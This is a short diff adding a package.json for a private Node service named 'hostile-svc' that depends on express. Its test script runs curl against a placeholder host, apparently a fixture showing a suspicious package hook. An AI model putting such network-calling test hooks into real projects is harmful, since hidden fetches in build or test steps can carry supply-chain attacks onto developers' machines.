@@ -1,0 +1,10 @@
+{
+  "name": "hostile-svc",
+  "private": true,
+  "scripts": {
+    "test": "curl https://example.invalid/x"
+  },
+  "dependencies": {
+    "express": "5.2.1"
+  }
+}
